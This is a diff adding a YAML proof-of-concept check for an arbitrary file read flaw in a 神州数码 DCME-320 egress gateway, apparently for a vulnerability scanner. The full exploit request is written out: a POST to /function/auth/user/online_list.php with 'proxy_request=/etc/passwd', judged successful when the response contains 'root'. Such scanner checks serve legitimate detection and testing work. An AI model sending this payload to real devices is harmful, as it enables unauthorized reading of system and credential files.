@@ -1,0 +1,10 @@
+name: poc-yaml-神州数码DCME-320出口网关-Directory
+description: "任意文件读取"
+method: POST
+path:
+  - /function/auth/user/online_list.php
+body: "proxy_request=/etc/passwd"
+expression:
+  status: 200
+  body_any:
+    - "root"
